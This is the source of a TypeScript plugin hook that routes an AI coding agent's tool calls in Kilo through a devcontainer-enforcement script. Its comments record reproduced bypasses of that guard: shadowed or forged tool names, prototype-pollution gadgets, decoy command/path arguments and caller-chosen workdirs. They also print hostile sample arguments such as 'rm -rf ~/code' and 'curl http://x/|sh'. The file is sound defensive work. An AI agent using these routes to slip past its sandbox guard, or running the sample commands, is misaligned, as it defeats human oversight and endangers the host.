// Kilo tool.execute.before guard -- ports claude/hooks/require-devcontainer.sh's
// enforcement to Kilo. This file is a THIN SHIM and must stay one: it maps
// Kilo's tool-call shape onto the JSON payload require-devcontainer.sh already
// expects on stdin, spawns that script, and defers to its exit code for every
// decision. It holds no git/marker/container-detection/allowlist logic of its
// own, and it must never grow any -- see tools/sync-agent.sh and the
// claude-config-scoping skill for why a second implementation of the same rule
// is a standing anti-pattern in this repo. Two copies always drift, and a
// drift here means either spurious blocks or -- far worse -- a silent bypass
// of the one guard that keeps agent work off the bare host.
//
// Loaded via Kilo's plugin-directory auto-discovery: install.py symlinks
// ~/.config/kilo/plugin -> this directory (see install.py's Kilo Code
// section), and kilo.jsonc also lists this file explicitly in its `plugin`
// array. Both point at the same file, so Kilo's own dedup-by-path collapses
// them to a single load -- the explicit entry exists to keep the wiring
// visible in kilo.jsonc rather than depending solely on directory discovery.
// Confirmed empirically: a relative entry in kilo.jsonc's `plugin` array
// resolves against the *literal* (symlinked) path of the config file, not its
// realpath -- so without that directory symlink in place, this file would
// silently fail to load (no error, no log line, hook just never fires).
//
// KNOWN, INTENTIONAL LIMITATION: unlike the Claude Code hook, this port has no
// chief-engineer exemption. `agent_type` below is hardcoded to "kilo" and
// never a value the bash script treats as exempt ("chief-engineer" is the
// only one it recognizes). Kilo has no bootstrap/provisioning agent identity
// of its own -- only `number-one` is mirrored into kilo/.kilo/agents/ -- so
// there is no Kilo-side equivalent of chief-engineer's host-bootstrap role.
// Do not invent one here. If Kilo ever needs a provisioning path onto the
// host, that is a decision for the Captain, not a default this shim assumes.
import type { Plugin } from "@kilocode/plugin"
import { spawnSync } from "node:child_process"
import { homedir } from "node:os"

// DENY BY DEFAULT -- issue #12. This file used to hold a single TOOL_MAP: any
// input.tool not present in it returned early with no call to the guard at
// all, i.e. was silently ALLOWED. Kilo's own hook types make that easy to fall
// into by accident: "tool.execute.before"'s `input.tool` is an untyped
// `string` and its `output.args` is `any` (confirmed against
// @kilocode/plugin's shipped dist/index.d.ts on this machine), so there is no
// compiler backstop that would flag a tool id this file has never heard of --
// it just silently returns. And Kilo's real tool vocabulary is far bigger than
// the four names TOOL_MAP used to cover: static analysis of the shipped
// @kilocode/cli 7.4.22 bundle found at least five built-in, host-affecting
// tools with no entry at all (interactive_terminal, background_process,
// skill, notebook_edit, notebook_execute), on top of an open-ended set this
// file can never enumerate ahead of time -- every MCP server's tools and every
// plugin's tools arrive under whatever name they choose.
//
// The fix inverts the default. READ_ONLY_TOOLS is an explicit, SHAPE-QUALIFIED
// allowlist of tool ids verified non-mutating; MUTATOR_TOOLS explicitly
// classifies the ones this guard knows how to judge;
// KNOWN_UNCLASSIFIED_MUTATORS names built-ins that are known to mutate or
// affect the host but that this guard cannot yet judge by shape (see the
// comment there); and the shape probe in the hook body below is a TIEBREAKER
// of last resort for the genuinely open-ended residue -- an MCP- or
// plugin-contributed name -- never the primary mechanism. Anything that falls
// through all four denies. A future Kilo release, MCP server, or plugin that
// adds a tool this file has not been taught about now gets a loud, actionable
// deny instead of a silent allow, and stays that way until someone classifies
// it below.
//
// The three arg keys this guard can classify a call by. A non-empty string
// `command` means "this call runs a shell command" -> the guard's Bash branch.
// A non-empty string `filePath`/`path` means "this call names a file or
// directory it acts on" -> the guard's Edit branch. Nothing else in an args
// object is a classification signal, because nothing else has a meaning the
// shared guard script knows how to consume.
const SHAPE_KEYS = ["command", "filePath", "path"] as const
type ShapeKey = (typeof SHAPE_KEYS)[number]

// Read-only / non-host-affecting tool ids, each mapped to the set of
// SHAPE_KEYS that tool LEGITIMATELY carries. Verified against the shipped
// @kilocode/cli 7.4.22 bundle (strings in its packed `.kilo` binary, cross-
// checked against its `PermissionConfig` schema, which enumerates every
// permission-gated tool/category) -- not merely carried over from the brief
// that first raised issue #12, which asked for exactly this cross-check.
// Each entry's execute() body was inspected, not just its name.
//
// A SET OF IDS WAS NOT ENOUGH, AND THIS IS THE SECOND THING THAT BROKE HERE.
// An earlier revision was `new Set([...ids])` and the hook body opened with an
// unconditional `if (READ_ONLY_TOOLS.has(input.tool)) return`. That is a free
// pass keyed purely on a NAME, and in Kilo a name is not a trustworthy thing
// to key on:
//   * Plugin-contributed tools are NOT namespaced. `Hooks.tool?: { [key:
//     string]: ToolDefinition }` -- the bare key IS the tool id -- and a
//     `~/.config/kilo/tool/read.ts` with a default export registers the tool
//     id `read` outright. (That directory is a SIBLING of this one:
//     ~/.config/kilo/plugin is already a symlink into this repo.)
//   * Contributed tools SHADOW built-ins. `ToolRegistry.all` returns
//     `[...builtin, ...custom]` with custom last, into a plain object keyed
//     by id -- last write wins -- and the shadowing tool inherits the
//     built-in's permission default, so Kilo's own prompt is cleared too.
//   * MCP tools ARE namespaced, but only as `sanitize(server) + "_" +
//     sanitize(tool)`. That blocks the bare names above but NOT the
//     underscored entries below: `notebook_read` is server `notebook` + tool
//     `read`, `repo_overview` is server `repo` + tool `overview`, and the
//     same trick reaches `semantic_search`, `kilo_local_recall`,
//     `kilo_memory_recall`, `list_mcp_resources` and `read_mcp_resource`.
// Reproduced live against this module before the fix: every id on this list,
// called with `{command: "rm -rf ~/code", path: "<project>/PWNED.txt"}`,
// returned ALLOW with the shared guard script never invoked at all (confirmed
// by re-running each case with HOME pointed at an empty directory -- if the
// guard had run, the missing script would have produced a spawn failure and a
// deny; it returned ALLOW instead, so no spawn happened).
//
// So the free pass is now conditional on SHAPE as well as name: a call keeps
// it only if it carries none of SHAPE_KEYS beyond the ones its real schema
// declares. Anything extra disqualifies it and it falls through to the
// classifier below, where the unexpected keys -- and only those -- are what it
// gets judged on. The declared keys are excluded from the probe deliberately,
// so a legitimate `read` is not re-judged as a write of the file it reads.
//
// THE DECLARED SHAPES BELOW ARE READ OFF THE REAL SCHEMAS, NOT ASSUMED. The
// brief that requested this fix proposed disqualifying on `command`,
// `filePath` OR `path` for every entry. That would have been an over-block:
// `read` and `lsp` take a REQUIRED `filePath`, and `glob`, `grep`,
// `notebook_read`, `semantic_search` and `repo_overview` all take a `path`.
// Blanket-disqualifying on a path would route every ordinary `read` into the
// Edit branch, which denies unconditionally outside a container -- i.e. it
// would block reading any file in a guarded project from the host, something
// neither the parent Claude Code hook (whose matchers cover Bash/Edit/Write/
// NotebookEdit and deliberately not Read) nor the Copilot port (`view | grep
// | glob) exit 0`) does. Each schema below was read out of the shipped bundle
// directly and is quoted with the field names it actually declares:
//   read           -- {filePath, offset?, limit?}. Queries the filesystem,
//                     never writes it. DECLARES filePath.
//   lsp            -- {operation, filePath, line, character, query?}.
//                     Confirmed query-only: the `operation` literals are
//                     goToDefinition/findReferences/hover/documentSymbol/
//                     workspaceSymbol/goToImplementation/prepareCallHierarchy/
//                     incomingCalls/outgoingCalls -- no rename/applyEdit
//                     operation exists in the shipped bundle. DECLARES
//                     filePath.
//   glob           -- {pattern, path?}. DECLARES path.
//   grep           -- {pattern, path?, include?}. DECLARES path.
//   notebook_read  -- {path, include_outputs?}. Reads a live VS Code
//                     notebook's cells. DECLARES path.
//   semantic_search-- {query, path?}. execute() only calls into the local
//                     search index; no write. DECLARES path.
//   repo_overview  -- {path?, repository?, depth?}. Read-only repository
//                     summary. DECLARES path.
//   webfetch       -- {url, format, timeout?}. Outbound HTTP GET, no local
//                     side effect. DECLARES nothing.
//   websearch      -- query-only outbound search. DECLARES nothing.
//   todowrite      -- {todos}. In-session bookkeeping only (the session's own
//                     todo list); no filesystem or process touched. DECLARES
//                     nothing.
//   question       -- {questions}. Asks the user something; does not act.
//                     DECLARES nothing.
//   kilo_local_recall,
//   kilo_memory_recall
//                  -- read Kilo's own memory store. NOT CONFIRMED AT SCHEMA
//                     LEVEL: unlike the entries above, no `O.Struct({...})`
//                     for these two was found in the shipped bundle (they
//                     arrive dynamically), so "declares nothing" here is the
//                     SAFE default rather than an observed fact. If a real
//                     call is ever seen carrying a path, it will be denied and
//                     the fix is to add the key here deliberately. The *_save
//                     counterpart (kilo_memory_save) is deliberately absent
//                     from this list entirely: it writes to that store, so it
//                     falls through to the deny below until someone judges it.
//   list_mcp_resources,
//   read_mcp_resource
//                  -- enumerate/read MCP-exposed resources; the MCP protocol
//                     distinguishes resources (read) from tools (act), and
//                     these two are the resource-read primitives, not tool
//                     calls. Same caveat as the two above: no bundled schema
//                     was found, so "declares nothing" is the safe default.
//   task           -- see the standalone comment on its entry below; it is
//                     here for a different reason than the rest of this list,
//                     not because it is "read-only" itself.
//
// KNOWN RESIDUAL, STATED PLAINLY RATHER THAN PAPERED OVER. This closes the
// forgeries that show themselves in the args, and nothing more. A contributed
// tool that shadows a name on this list and does its damage INSIDE its own
// implementation -- no `command`, no path, or only the path its real
// counterpart would legitimately carry -- still gets the free pass. A
// contributed `read` handed `{filePath: "x"}` is indistinguishable from the
// real `read` handed `{filePath: "x"}`, because the args ARE identical; only
// the implementation differs, and this hook cannot see an implementation. That
// is a fundamental limit of classifying by args shape and it applies to every
// tool this file allows, not only shadowed ones. Do NOT read this list as
// "safe against contributed tools". It is not, and no shape rule can make it
// so. The real mitigation for that class is not installing tools you have not
// read, which is a policy this file cannot enforce.
//
// A Map, not a plain object, for the same reason as MUTATOR_TOOLS below --
// `input.tool` is an attacker-influenced string and a plain object's lookup
// walks Object.prototype. See that comment for the reproduced bypass.
const READ_ONLY_TOOLS: Map<string, ReadonlySet<ShapeKey>> = new Map([
  ["read", new Set<ShapeKey>(["filePath"])],
  ["lsp", new Set<ShapeKey>(["filePath"])],
  ["glob", new Set<ShapeKey>(["path"])],
  ["grep", new Set<ShapeKey>(["path"])],
  ["notebook_read", new Set<ShapeKey>(["path"])],
  ["semantic_search", new Set<ShapeKey>(["path"])],
  ["repo_overview", new Set<ShapeKey>(["path"])],
  ["webfetch", new Set<ShapeKey>()],
  ["websearch", new Set<ShapeKey>()],
  ["todowrite", new Set<ShapeKey>()],
  ["question", new Set<ShapeKey>()],
  ["kilo_local_recall", new Set<ShapeKey>()],
  ["kilo_memory_recall", new Set<ShapeKey>()],
  ["list_mcp_resources", new Set<ShapeKey>()],
  ["read_mcp_resource", new Set<ShapeKey>()],
  // `task` delegates a turn to a subagent; it does not itself touch the
  // filesystem or spawn a process. The delegated agent's own tool calls fire
  // this SAME hook -- Kilo registers plugin hooks once, server-wide, not per
  // session -- so whatever the subagent actually does still gets checked at
  // the point it does it. Treating `task` as out-of-scope here is therefore
  // deferral, not a gap: the call that can actually be judged is the one that
  // gets judged. (This rests on Kilo's hooks being server-wide rather than
  // session-scoped, which was not independently exercised at runtime here --
  // see the report for what that would take to confirm.)
  //
  // `task` DECLARES `command`, AND THAT IS THE WHOLE POINT OF THE DECLARED-
  // SHAPE COLUMN. Its confirmed schema is {description, prompt,
  // subagent_type, task_id?, command?}, where `command` is annotated in the
  // bundle as "The command that triggered this task" -- a slash-command NAME
  // (e.g. "review"), not a shell command. Judging that name against the shared
  // guard's shell allowlist would deny a legitimate delegation for a reason
  // that has nothing to do with what it does. Declaring `command` here means
  // the probe below never treats task's `command` as a signal and never
  // submits it as a Bash payload -- the misclassification is structurally
  // unreachable, not special-cased at the probe.
  //
  // It declares NOTHING ELSE, and that is deliberate too: the schema has no
  // path field, so a `task` call carrying a `filePath` or `path` is either a
  // future Kilo change this file has not been taught about or a forgery. Such
  // a call loses the free pass and is judged on that path alone -- Edit branch
  // only, with its `command` still never reaching the Bash allowlist.
  ["task", new Set<ShapeKey>(["command"])],
])

// require-devcontainer.sh only branches on "Bash" vs. everything else in
// {Edit, Write, NotebookEdit} -- it has no per-file-tool logic. So every
// mutator classified "Edit" below takes the identical path through the
// script, and everything classified "Bash" is judged by the script's
// command allowlist against the call's cwd/workdir.
//
//   bash                             -> Bash. The shell tool.
//   interactive_terminal             -> Bash. Confirmed by decompiling the
//                                        shipped bundle: its execute() reads
//                                        `_.command.trim()` and an optional
//                                        `_.workdir`, the same shape as bash.
//                                        It is an interactive PTY, not a
//                                        one-shot shell, but what it runs is
//                                        still a `command` string and the
//                                        guard's allowlist still applies to
//                                        it.
//   background_process               -> Bash. Confirmed by the tool's own
//                                        shipped description string: "Uses
//                                        the same permissions as the bash
//                                        tool, plus a directory permission
//                                        when `workdir` is outside the
//                                        project." Same `command`/`workdir`
//                                        shape as bash and
//                                        interactive_terminal.
//   edit, write                      -> Edit. File-mutation tools; carry a
//                                        top-level `filePath`.
//   notebook_edit, notebook_execute  -> Edit. Confirmed by decompiling the
//                                        shipped bundle: both call
//                                        `.ask({permission, patterns:
//                                        [A.path], ...})`, so both carry a
//                                        top-level `path`. notebook_execute
//                                        runs a cell's code, which is
//                                        arbitrary execution, not a write --
//                                        but the guard's Edit branch already
//                                        gives the right answer for that: it
//                                        blocks unconditionally outside a
//                                        container and imposes no allowlist
//                                        inside one, which is exactly
//                                        "container gates it, nothing else
//                                        does" and does not require
//                                        misreading notebook cell content as
//                                        a shell command.
//   apply_patch                      -> Edit. See the apply_patch handling
//                                        below the hook body -- its args have
//                                        NO path field at all, confirmed by
//                                        decompiling the shipped bundle
//                                        (Kilo's own ApplyPatchTool.execute
//                                        takes `{patchText: string}`; the
//                                        `{operation: {path, diff}}` shape an
//                                        earlier revision of this file
//                                        assumed belongs to a different layer
//                                        -- the AI SDK's OpenAI Responses
//                                        provider translating a *model's*
//                                        native apply_patch call, not to what
//                                        arrives at this hook -- so that
//                                        assumption was corrected, not kept
//                                        as a defensive fallback).
// MAP, NOT A PLAIN OBJECT -- and this is load-bearing, not a style choice. See
// the classification-lookup comment in the hook body below for the bypass
// this closes: a plain-object literal is looked up here by `input.tool`,
// which is an attacker-influenced string (any MCP server or plugin picks its
// own tool names), and JS's `in`/bracket access on a plain object walks the
// *entire prototype chain* -- so a tool literally named "constructor",
// "toString", "hasOwnProperty", "__proto__", etc. would test true against an
// inherited `Object.prototype` member despite never being added here. `Map`
// has no prototype-chain lookup surface for its keys at all: `.has()`/`.get()`
// only ever see entries actually inserted via `.set()`/the constructor, so
// there is no string that can forge a hit. Do not revert this to `{...}` --
// see the reviewer-reproduced bypass this fixed, documented at the call site.
const MUTATOR_TOOLS: Map<string, "Bash" | "Edit"> = new Map([
  ["bash", "Bash"],
  ["interactive_terminal", "Bash"],
  ["background_process", "Bash"],
  ["edit", "Edit"],
  ["write", "Edit"],
  ["notebook_edit", "Edit"],
  ["notebook_execute", "Edit"],
  ["apply_patch", "Edit"],
])

// Known, host-affecting Kilo built-ins this guard cannot yet judge by shape.
// Both were found by the same bundle audit that filled in MUTATOR_TOOLS
// above, and both were left out of it deliberately rather than guessed at:
//   skill           -- execute() resolves the call by `E.name` alone (a skill
//                       name) and then runs shell snippets drawn from that
//                       skill's SKILL.md. There is no `command` or `path` on
//                       the call itself for this guard to judge -- the
//                       dangerous part is inside a file this hook never sees.
//   generate_image   -- calls out to an image-generation API. Its args were
//                        not confirmed to carry a `command` or a `path`
//                        this guard could check, and "probably writes an
//                        image somewhere" is exactly the kind of guess this
//                        whole fix exists to stop making.
// Both explicitly deny rather than fall through to the generic message the
// unclassified branch below would give, so the deny names the real reason
// instead of a generic "no shape found".
// A Map for the same reason as MUTATOR_TOOLS immediately above -- see that
// comment. `input.tool` is looked up here too, and it is the identical
// attacker-influenced string, so the identical prototype-chain bypass would
// apply to a plain object literal here just as it did there.
const KNOWN_UNCLASSIFIED_MUTATORS: Map<string, string> = new Map([
  [
    "skill",
    "it executes shell snippets drawn from a SKILL.md file, and this guard cannot inspect a skill's contents from its call alone",
  ],
  [
    "generate_image",
    "it calls an external image-generation API and this guard could not confirm a checkable command or file-path shape for it",
  ],
])

// OWN-PROPERTY READ, NOT A PROTOTYPE-CHAIN READ -- and, like the Map choice
// above, this is load-bearing rather than pedantry. `output.args` is typed
// `any` by @kilocode/plugin and is a plain object at runtime, so a bare
// `args.path` walks Object.prototype exactly the way `MUTATOR_TOOLS[tool]`
// used to. The Map/Set hardening above covered the tool NAME lookup and did
// not extend here. Reproduced live against this module before this fix: with
// `Object.prototype.path = "/tmp/definitely-not-a-git-repo/x"` set by any
// pollution gadget anywhere else in the process, an unknown tool calling
// `{command: "rm -rf ~/code"}` -- an args object with no `path` of its own --
// read the inherited value, classified Edit, and was ALLOWED, because the
// shared guard finds no git repo above /tmp and exits 0. `Object.hasOwn`
// closes that: an inherited key is invisible here.
//
// (JSON-borne pollution via `{"__proto__": {...}}` in a tool's arguments is a
// different thing and was confirmed inert -- `JSON.parse` does not set the
// prototype for that key -- so the gadget has to already exist elsewhere in
// the process. That is a real precondition, but "needs another bug first" is
// not a reason to leave a one-line hole open.)
//
// NON-EMPTY IS PART OF THE TEST, NOT A TIDINESS FLOURISH. The shared guard
// script treats an empty command as out of scope (`[ -n "$command" ] ||
// exit 0`) and an empty file_path as "judge my own cwd instead". So an empty
// string is never a usable signal here; treating it as one would classify a
// call on the strength of a key that tells the guard nothing.
const ownNonEmptyString = (args: any, key: string): string | undefined => {
  if (!Object.hasOwn(args, key)) return undefined
  const value = args[key]
  return typeof value === "string" && value !== "" ? value : undefined
}

// One judgement to submit to the shared guard script. A call can produce more
// than one -- see the both-shapes handling in the hook body -- and every one
// of them has to come back clean for the call to proceed.
type Submission = { toolName: "Bash" | "Edit"; command?: string; filePath?: string }

const RequireDevcontainer: Plugin = async (ctx) => {
  // Captured once per session at plugin-load time -- "current working
  // directory for this session" per Kilo's plugin docs. This is the right
  // fallback for Bash: require-devcontainer.sh judges Bash purely by session
  // cwd anyway (a `cd` inside the command string isn't resolvable from a
  // hook either way), so a per-session value loses nothing relative to what
  // the script already expects.
  const sessionDirectory = ctx.directory

  return {
    "tool.execute.before": async (input, output) => {
      const args = output?.args ?? {}

      // WHICH SHAPE KEYS IS THIS CALL ACTUALLY CARRYING, AS SIGNALS?
      //
      // A tool on READ_ONLY_TOOLS declares the subset of SHAPE_KEYS its real
      // schema carries (verified per tool -- see that comment). Those declared
      // keys are not signals FOR THAT TOOL: a `read` with a `filePath` is just
      // a read. Every other carried key is a signal. A tool that is not on the
      // read-only list declares nothing, so all three keys are signals for it,
      // which is exactly the behaviour the residual bucket had before.
      // A MAP, NOT A `Partial<Record<ShapeKey, string>>` OBJECT LITERAL, AND
      // THIS IS THE THIRD TIME THE SAME DEFECT HAS BITTEN THIS FILE. The first
      // draft of this block accumulated into `{}` and read it back as
      // `signals.command`. That is a prototype-chain read on an object this
      // hook builds itself, and it is reachable: caught by the regression
      // suite for this change, with `Object.prototype.command = "ls"` set,
      // `bash` with `args = {}` was ALLOWED -- `ownNonEmptyString` correctly
      // found no own `command` on the args and stored nothing, and then
      // `signals.command` inherited "ls" from the polluted prototype and
      // submitted it as the command to judge. The pollution hardening
      // elsewhere in this file does not help if the guard's own scratch object
      // is the thing being read through. `.get()` on a Map only ever sees what
      // was `.set()` into it, so there is no inherited value to find.
      const declared = READ_ONLY_TOOLS.get(input.tool)
      const signals: Map<ShapeKey, string> = new Map()
      for (const key of SHAPE_KEYS) {
        if (declared?.has(key)) continue
        const value = ownNonEmptyString(args, key)
        if (value !== undefined) signals.set(key, value)
      }
      const hasSignal = signals.size > 0

      // THE READ-ONLY FREE PASS IS CONDITIONAL ON SHAPE, NOT ON NAME ALONE.
      // It used to be `if (READ_ONLY_TOOLS.has(input.tool)) return` --
      // unconditional, and therefore forgeable by anything that could choose
      // its own tool id: a plugin's `Hooks.tool` key, a `tool/read.ts`, or an
      // MCP server named to reconstruct one of the underscored ids. See the
      // READ_ONLY_TOOLS comment for the reproduction; every id on the list
      // carrying a real `command` was allowed with the guard never invoked.
      //
      // Now a call keeps the free pass only if it carries nothing beyond its
      // declared shape. Carrying anything else drops it into the classifier
      // below, where the unexpected keys -- and only those -- decide how it is
      // judged. `task` is still structurally safe from the Bash allowlist: it
      // DECLARES `command`, so its slash-command name is never a signal and
      // can never become a Bash payload, whatever else the call carries.
      //
      // What this does NOT do is make the allowlist safe against contributed
      // tools in general. A shadowing tool that keeps to its counterpart's
      // declared shape is still waved through -- see the KNOWN RESIDUAL note
      // on READ_ONLY_TOOLS. Do not let this comment be read as a stronger
      // claim than the code makes.
      if (declared !== undefined && !hasSignal) return

      const submissions: Submission[] = []

      // .has()/.get() on a Map, not `in`/bracket-index on a plain object --
      // see the comment on MUTATOR_TOOLS above for why. Reproduced live
      // before this fix: with the old object-literal form, a tool named
      // "constructor", "toString", "__proto__", "hasOwnProperty", or any
      // other Object.prototype member name tested true via `in` despite
      // never being registered, and the bracketed lookup then returned an
      // inherited function/object rather than "Bash"/"Edit" -- which
      // silently produced a non-string `mapped`, JSON.stringify silently
      // DROPPED that function-valued key from the payload entirely, and the
      // shared guard's own `*) exit 0` fallback (no tool_name it recognizes)
      // allowed the call unconditionally. A malicious or compromised MCP
      // server needed only to register a tool under one of those names to
      // bypass this guard completely, regardless of what the tool actually
      // did. Map has no such surface: `.has()`/`.get()` only ever see
      // entries actually `.set()` into it.
      if (MUTATOR_TOOLS.has(input.tool)) {
        const mapped = MUTATOR_TOOLS.get(input.tool)

        // BELT AND BRACES over the Map lookup immediately above: assert the
        // value really is one of the two strings the rest of this function
        // assumes, and deny loudly rather than carry on if it somehow is not.
        // Deliberately redundant with TypeScript's typing of MUTATOR_TOOLS as
        // `Map<string, "Bash" | "Edit">` -- the type checker cannot stop a
        // future edit from reintroducing a plain object literal, or from
        // threading the result through an `any`, and the whole character of
        // the prototype-chain bypass this replaced was that a wrong value
        // degraded SILENTLY.
        //
        // SCOPE OF THIS CHECK, STATED HONESTLY. An earlier revision of this
        // comment claimed the check made "that specific failure mode
        // structurally unable to recur unnoticed". It did not: it validates
        // `mapped`, and the failure mode it described was JSON.stringify
        // dropping an undefined-valued key from `tool_input`, which this check
        // never sees. That hole was real and reachable by an entirely
        // different route -- `bash` with `args = {}` -- see the payload
        // validation in each branch below, which is what actually closes it.
        // This check covers the classification value and nothing else.
        if (mapped !== "Bash" && mapped !== "Edit") {
          throw new Error(
            `BLOCKED by kilo/plugin/require-devcontainer.ts: internal error classifying the "${input.tool}" tool call (got ${JSON.stringify(mapped)}, expected "Bash" or "Edit"). Refusing rather than allowing this call through with the guard in an inconsistent state. This is a bug in the hook, not in your command -- report it to the Captain.`,
          )
        }

        if (mapped === "Bash") {
          // A Bash-mapped tool with no usable `command` USED TO FAIL OPEN, and
          // this is the third thing that broke here. The payload was built as
          // `tool_input: { command: args.command }`; when `args.command` was
          // undefined or null, JSON.stringify DROPPED the key, the shared
          // guard's `command=$(... // empty)` came back empty, and its
          // `[ -n "$command" ] || exit 0` allowed the call. Reproduced live
          // against this module before this fix: `bash` with `args = {}`,
          // `{command: undefined}` and `{command: null}` all returned ALLOW,
          // and so did `interactive_terminal` and `background_process` with
          // `args = {}`. The Copilot port DENIES the identical case
          // ("no command could be extracted from the bash call's toolArgs"),
          // so this was also a live divergence between two ports of one rule.
          //
          // Mirror Copilot: a shell tool that cannot show this guard what it
          // would run is refused, not inherited as an allow. This is the
          // payload-level check the BELT AND BRACES note above does not and
          // cannot perform.
          const command = signals.get("command")
          if (command === undefined) {
            throw new Error(
              `BLOCKED by kilo/plugin/require-devcontainer.ts: the "${input.tool}" tool runs shell commands, but this call carried no non-empty string \`command\` for the guard to inspect. Refusing rather than allowing a shell call whose command this guard could not see -- an absent or non-string command is dropped from the guard's payload entirely and would otherwise be treated as out of scope and allowed.`,
            )
          }
          submissions.push({ toolName: "Bash", command })
        } else {
          // edit/write/notebook_edit/notebook_execute carry a top-level
          // `filePath` or `path` (confirmed per-tool in the MUTATOR_TOOLS
          // comment above; `path` is read as a fallback for the tools that use
          // that key, not as a guess). apply_patch has NEITHER: its confirmed
          // shape is `{ patchText: string }`, with no path field at all.
          //
          // NO PAYLOAD CHECK ON THIS BRANCH, DELIBERATELY, AND IT IS NOT THE
          // SAME HOLE AS THE BASH BRANCH. An absent file_path does not fail
          // open in the shared guard: it falls back to judging "." -- the
          // script's own process cwd, which is set to `cwd` below -- so the
          // call is still judged against a real directory. Confirmed live:
          // `edit` and `write` with `args = {}` both DENY today, and
          // apply_patch (which legitimately has no path) denies the same way.
          // Adding a "must have a path" throw here would break apply_patch for
          // no security gain. The residual is narrower and already disclosed:
          // it cannot catch a patch whose file headers point OUTSIDE the
          // session's project.
          submissions.push({ toolName: "Edit", filePath: signals.get("filePath") ?? signals.get("path") })
        }
      } else if (KNOWN_UNCLASSIFIED_MUTATORS.has(input.tool)) {
        // A known, host-affecting built-in with no shape this guard can
        // judge -- see the comment on KNOWN_UNCLASSIFIED_MUTATORS above for
        // why each one is here rather than in MUTATOR_TOOLS. Deny by name,
        // not by falling through to the generic unclassified message below,
        // so the reason is specific.
        throw new Error(
          `BLOCKED by kilo/plugin/require-devcontainer.ts: the "${input.tool}" tool is a known, host-affecting Kilo built-in that this guard cannot yet check -- ${KNOWN_UNCLASSIFIED_MUTATORS.get(input.tool)}. Refusing rather than allowing it unguarded. This is a gap in the guard, not in your call -- report it to the Captain so "${input.tool}" can be classified.`,
        )
      } else {
        // Genuinely open-ended residue: an MCP-server-contributed tool, a
        // plugin-contributed tool, a future Kilo built-in this file has not
        // been taught about yet -- or a read-only-listed tool that lost its
        // free pass by carrying a shape its real schema does not declare.
        // This is the ONLY place a shape probe runs, and it is a TIEBREAKER,
        // not the primary mechanism -- it exists because this bucket, unlike
        // the two above, cannot be enumerated ahead of time no matter how
        // thorough the bundle audit is.
        //
        // `task`'s slash-command name cannot reach the Bash allowlist from
        // here. It does not get here by declaring `command` (it may well get
        // here, if it carries an undeclared path) -- it gets protected by
        // `signals` never containing a key the tool declares. So a `task`
        // call is judged only on what its schema does not account for.
        //
        // BOTH SHAPES ARE SUBMITTED WHEN BOTH ARE PRESENT. NEITHER ORDERING
        // IS SAFE, AND THE CLAIM THAT ONE WAS IS THE SECOND BLOCKING DEFECT
        // THIS FILE HAD.
        //
        // The history matters because both wrong answers looked right:
        //   * Command-first was a DECOY. An MCP tool named e.g. "mcp_writer"
        //     whose real action writes to `path`, but which also stuffs an
        //     innocuous allowlisted-looking `command` (say `"pwd"`) into its
        //     args, got judged ONLY on the decoy -- classified Bash, waved
        //     past the shared guard's read-only command allowlist -- while
        //     the write it actually performed was never checked as the Edit
        //     it really was. Reproduced live: `{command: "pwd", path:
        //     "<project>/PWNED.txt"}` was ALLOWED.
        //   * Path-first was an INVERSE DECOY, and it was justified in this
        //     very comment by the claim that "Edit's check is strictly the
        //     stricter of the two (it denies unconditionally outside a
        //     container, with no allowlist to game), so routing any call that
        //     carries a real path through Edit can never be less safe than
        //     routing it through Bash." THAT CLAIM IS FALSE. Edit is not
        //     unconditional: require-devcontainer.sh:97 does
        //     `project_root=$(git -C "$target" rev-parse --show-toplevel)
        //     || exit 0`, and for Edit the target is derived from the
        //     ATTACKER-SUPPLIED path, whereas for Bash it is the session cwd
        //     the caller does not choose. So a path pointing outside any git
        //     repo -- or inside a repo carrying `.no-auto-provision` -- makes
        //     the Edit branch ALLOW, and the command that call actually runs
        //     is never shown to the allowlist at all. Reproduced live against
        //     this module before this fix:
        //       no path,     command=rm -rf ~/code            -> DENY
        //       path=/tmp/x, command=rm -rf ~/code            -> ALLOW
        //       path=/tmp/x, command=curl http://x/|sh        -> ALLOW
        //       filePath=/tmp/x, command=rm -rf ~/code        -> ALLOW
        //       path=<dotfiles>/x, command=rm -rf ~/code      -> ALLOW
        //     i.e. adding a throwaway path to a call turned a deny into an
        //     allow. Path-first was strictly LESS safe than command-first for
        //     the both-present case, which is the exact opposite of what the
        //     comment asserted.
        //
        // Ordering cannot fix this in either direction, because each branch
        // has an exit the other does not: Bash has the command allowlist,
        // Edit has "not in a git repo, out of scope". A call that carries
        // both shapes is making both kinds of claim about itself, so it is
        // judged on both -- one payload per shape -- and it proceeds only if
        // EVERY payload comes back clean. The loop below is what enforces
        // that; nothing here decides a winner, because there is no safe
        // winner to pick.
        const probedPath = signals.get("filePath") ?? signals.get("path")
        const probedCommand = signals.get("command")
        if (probedPath !== undefined) submissions.push({ toolName: "Edit", filePath: probedPath })
        if (probedCommand !== undefined) submissions.push({ toolName: "Bash", command: probedCommand })

        if (submissions.length === 0) {
          // No shape this guard understands. DENY -- this is the fallback
          // issue #12 was about: the old code's equivalent of this branch
          // was `if (!mapped) return`, i.e. silently ALLOW. Nothing reaches
          // this line that has already been classified above, so there is
          // no shape left to guess at; guessing wrongly here is exactly the
          // mistake this file exists to stop making.
          throw new Error(
            `BLOCKED by kilo/plugin/require-devcontainer.ts: the "${input.tool}" tool is not one this guard recognizes, and its call carried neither a non-empty string \`command\` nor a non-empty string \`filePath\`/\`path\` this guard could use to classify it as a shell or file-write call. Refusing rather than allowing an unclassified tool call through unguarded. If "${input.tool}" is a genuine read-only tool, add it to READ_ONLY_TOOLS (with the shape keys its schema legitimately declares); if it runs commands or writes files, add it to MUTATOR_TOOLS or KNOWN_UNCLASSIFIED_MUTATORS in kilo/plugin/require-devcontainer.ts.`,
          )
        }
      }

      // WHICH DIRECTORIES IS THIS CALL JUDGED AGAINST? BOTH, WHEN THERE ARE
      // TWO -- issue #25, AND THIS WAS A LIVE BYPASS, NOT A HARDENING NICETY.
      //
      // This used to be `ownNonEmptyString(args, "workdir") ?? sessionDirectory`
      // -- the per-call `workdir` preferred *instead of* the session directory.
      // That let the caller choose the directory it was judged against, which
      // defeats the Bash branch entirely: require-devcontainer.sh:97 does
      // `project_root=$(git -C "$target" rev-parse --show-toplevel) || exit 0`,
      // so a `workdir` pointing anywhere outside a git repo short-circuits to
      // ALLOW before any container or allowlist check runs. Reproduced live
      // against this module (Node native type stripping, real non-containerized
      // git repo, real guard script):
      //   workdir="/tmp",  bash command="npm ci"   -> ALLOW
      //   workdir absent,  bash command="npm ci"   -> DENY   ('npm' is not on
      //                                                       the host
      //                                                       read-only
      //                                                       allowlist)
